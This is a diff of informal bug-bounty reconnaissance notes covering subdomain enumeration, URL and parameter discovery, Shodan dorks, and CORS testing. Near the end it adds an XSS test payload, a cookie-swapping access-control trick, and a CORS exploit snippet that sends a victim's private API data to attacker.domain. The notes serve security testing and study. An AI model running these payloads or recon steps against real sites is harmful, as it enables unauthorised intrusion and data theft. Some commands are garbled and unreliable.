@@ -15,8 +15,8 @@ paramsfinder
 fuff
 photon
 
-how to use files everywhere
  $ chmod +x (tool)
+how to use files everywhere
 # mv (tool) /usr/local/bin
                                                    
    breif summary of my recon
@@ -37,11 +37,15 @@ recon with bill  (summary)
 githubtesting049@gmail.com
 
 
-place all the target in burpdsite
+place all the target in burpdsite  
+
+  subfinder
 
 Use Wappalyzer to check CMS or Builtwith or Retire.js or Ghostery
 
 check for languages and framwork used tools -wapplyzer and also server running
+
+    
 
  whatweb -a 3 (url)
  ping -c 1 (ip)
@@ -63,24 +67,144 @@ Scan each individual IP address associated with their subdomains and having the 
 CHECK FOR OPEN PORT TOOLS, PORT COMMONLY USED 80, 441, 81   &&
 Look for any services running on unusual ports or any service running on default ports which could be vulnerable (FTP, SSH, etc). Look for the version info on services running in order to determine whether anything is outdated and potentially vulnerable
 
-DIG,WHOIS,WHATWEB,MAP, masscan. arjun
+
 
 subdomain eneumeration
+subfinder 
+subfinder -d url - active | tee -a subfinder.txt
+subfinder -d google.com -all > subdomain.txt
 
+ sublistr
 sublist3r example.com -o output ... $ cat output foo.example.com bar.example.com
-
+ python3 sublist3r.py tesla.com
+  python3 sublist3r.py -d tesla.com -b optional 
+  
+  
 amass
-
+amass enum -asn -d tesla.com
 amass enum [-active] [-ip] -d target
 amass enum -d tesla.com | grep target
 amass enum -d target.com -o /filepath/subdomains.txt
-     
 
-subrute.py
+     
+     
+     BRUTEFORCE SUBDOMIAN
+     KNOCKPY TESLA.COM
+
+    dnsgen  (dns geneartor)
+    echo "url" |dnsgen| tee -a subtxt
+    
+    
+    CENsYS
+    check for command line tools 
+     check for api-key 
+     python3 censys-subdomain.py (url)
+     Look for SSL certificate:
+    
+    
+    CHAOS  
+    CHECK FOR github to get the api-key to run it
+    
+     
+     FILTERING OUT LIVE SUBDOMIN
+    Httpx
+    cat | grep -E  (url ) | sort -u | tee -u | tee all_url.txt 
+ httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
+  cat file.txt | httpx -sc
+  
+  Httprobe 
+  check for also the github docs 
+  certspotter corp.yahoo.com | httprobe
+  httprobe $ cat output.txt | httprobe | tee -a domains
+    sort subdomain
+   sort -u subdomains.txt | httprobe > /filepath/uniq.txt    
+  
+  URL RECON - EXTRACTION
+  gau
+  echo "url" | gau | tee gau.txt
+  cat gau.txt | grep ? | tee param.txt    
+     
+     
+     JAVASCRIPTS FILES
+     cat param.txt | grep -E *[.]js | tee javascript.txt
+     
+     
+     
+           SORTING OUT URL 
+      gf check github for help
+      cat | gf redirect | tee redirect.txt
+     
+     
+     
+     
+     check for goSpider github
+     Gospider -s (url) --subs --js || tee gospider.txt
+     fillter files fron it
+     cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
+     
+     
+     FIND PARAMETERS
+     PARAMSPIDER 
+     Phythn3 paramspider -d tesla.com
+     
+     ARJUN 
+      arjun  --help
+     arjun -u tesla.com
+     
+     
+     
+    WAYBACKURL FOR BUG HUNTING
+    waybackurl  (git the github usage)
+    echo "url" | waybackurl
+    
+    waybackmachine
+
+
+ttps://web.archive.org/web/*/facebook.com/*
+.zip
+.backup
+.config
+.csv
+.pdf
+/api
+/admin/
+grep "\.txt"
+~ "\.log"
+~ "\.cache"
+~ "\.secret"
+~ "\.db"
+~ "\.backup"
+~ "\.yml"
+~ "\.json"
+~ "\.gz"
+~ "\.rar"
+~ "\.zip"
+~ "\.config"     
+
+      
+      AUTOMATION FOR REPLACING PARAMETERS WITH PAYLOADS
+      QSREPLACE
+      cat file.txt | qsreplace "<script>alert(1) </script>"  
+      
+      
+      FOOTPRINTING WEBSITES 
+      whatweb (url) -v a4
+      osint framwork.com
+     netcratf.com
+     securityheaders.com
+     Dnsdumster.com
+     whois.com
+     mxtoolbox.com
+     
+     emkel.c2       //// fakemails
+
+   
+ 
+ 
+ 
 ./subbrute.py cloudflare.com -o cloudflare.names
 
-subfinder -d google.com -all > subdomain.txt
- httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
+
  
  ./dnsrecon.py -d securitytrails.com
  
@@ -89,13 +213,15 @@ subfinder -d google.com -all > subdomain.txt
 #From https://github.com/allyshka/vhostbrute
 vhostbrute.py --url="example.com" --remoteip="10.1.1.15" --base="www.example.com" --vhosts="vhosts_full.list"
 
-  sort subdomain
-   sort -u subdomains.txt | httprobe > /filepath/uniq.txt  
-   eyewitness --web -f uniq.txt -d /path_to_save_screenshots
 
 
- Check which domains resolve
-Use httprobe $ cat output | httprobe | tee -a domains
+   eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
+   
+   
+   
+
+
+
 
 
 
@@ -124,10 +250,6 @@ gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/DNS/subdomain
 
 
 
-Check for how many subdomains are alive/online ?
-certspotter corp.yahoo.com | httprobe
-
-
 whoxy.com   //asset discovery  for root domain
 
 Perform reverse DNS lookups on the IP’s you discover through these search engines and see if you can identify IPs, ASN’s, root domains, or other unlinked company owned assets. (shodan , censys, and whoxy.com)
@@ -135,8 +257,7 @@ Perform reverse DNS lookups on the IP’s you discover through these search engi
 
 Ports:8443, 8080 Title: "Dashboard[Jenkins]" Product: Tomcat Hostname: example.com Org: google ssl:Google
 
-Censys
-Look for SSL certificate:
+
 
 Shodan for bug hunting
 https://www.shodan.io/search?query=ssl%3A%22Paypal%22
@@ -148,27 +269,7 @@ https://www.shodan.io/search?query=org%3A%22Amazon%22+ssl%3A%22Paypal%22
 https://www.shodan.io/search?query=http.component%3A%22jenkins%22
 https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22
 
-waybackurl for bug hunting
-ttps://web.archive.org/web/*/facebook.com/*
-.zip
-.backup
-.config
-.csv
-.pdf
-/api
-/admin/
-grep "\.txt"
-~ "\.log"
-~ "\.cache"
-~ "\.secret"
-~ "\.db"
-~ "\.backup"
-~ "\.yml"
-~ "\.json"
-~ "\.gz"
-~ "\.rar"
-~ "\.zip"
-~ "\.config"
+
 
 
 
@@ -387,6 +488,9 @@ blc -rof --filter-level 3 https://example.com/
 Ouput will be like Something.
 ─BROKEN─ https://www.linkedin.com/company/ACME-inc-/ (HTTP_999)
 Now you need to check if company has the page or not , if no then register as the company or try to get that username or url.
+
+   BROKEN ACCESS CONTROL
+   ALWAYS REPLACE BOTH THE COOKIE AND REFERER OF AN AUTHICATED( ORIGINAL PASSWORD AND USERNAME ) REQUEST INTO AN UNAUTHENCATED (FAKE PASSWORD AND FAKE USERNAME) IN BURP
 
 
 
@@ -963,6 +1067,18 @@ As a result of these limitations, many servers programmatically generate the Acc
 
 
 
+ BLACK BOX CORS TESTING 
+  TEST THE APPLICTAION FOR DYNAMIC GENERATION
+  	does it reflect the user -supplied ACAO header 
+  	does it only validate on the start/ end of a specific string ? .  the results from wrong regex expresion 
+  	does it allow the null origin
+  	does it restrict the protocol
+  	does it allow credential when option 2 ( does it only validate on the start/ end of a specific string ) is true
+   
+   
+
+
+
 
 Access-Control-Allow-Methods: This header defines which HTTP methods (e.g., GET, POST) are allowed in cross-origin requests.
 Access-Control-Allow-Headers: This header specifies the HTTP headers that can be used in the actual request.
@@ -975,6 +1091,17 @@ Access-Control-Allow-Credentials: If this is set to true, it means that the webs
    https://attacker.com                                true                                                     yes
      null                                                true                                                  yes
      *                                                  true                                                    no
+     
+     
+    THE  BASIC TECHNIQUE  WHEN ACCES-CONTROL-ALLOW- CREDENTIAL IS SET TO TRUE
+     var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open(“get”,”https://vulnerable.domain/api/private-data”,true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+ location=”//attacker.domain/log?response=”+this.responseText;
+};
   
 
  \\ USING CURLS WHEN TESTIN FOR CORS //
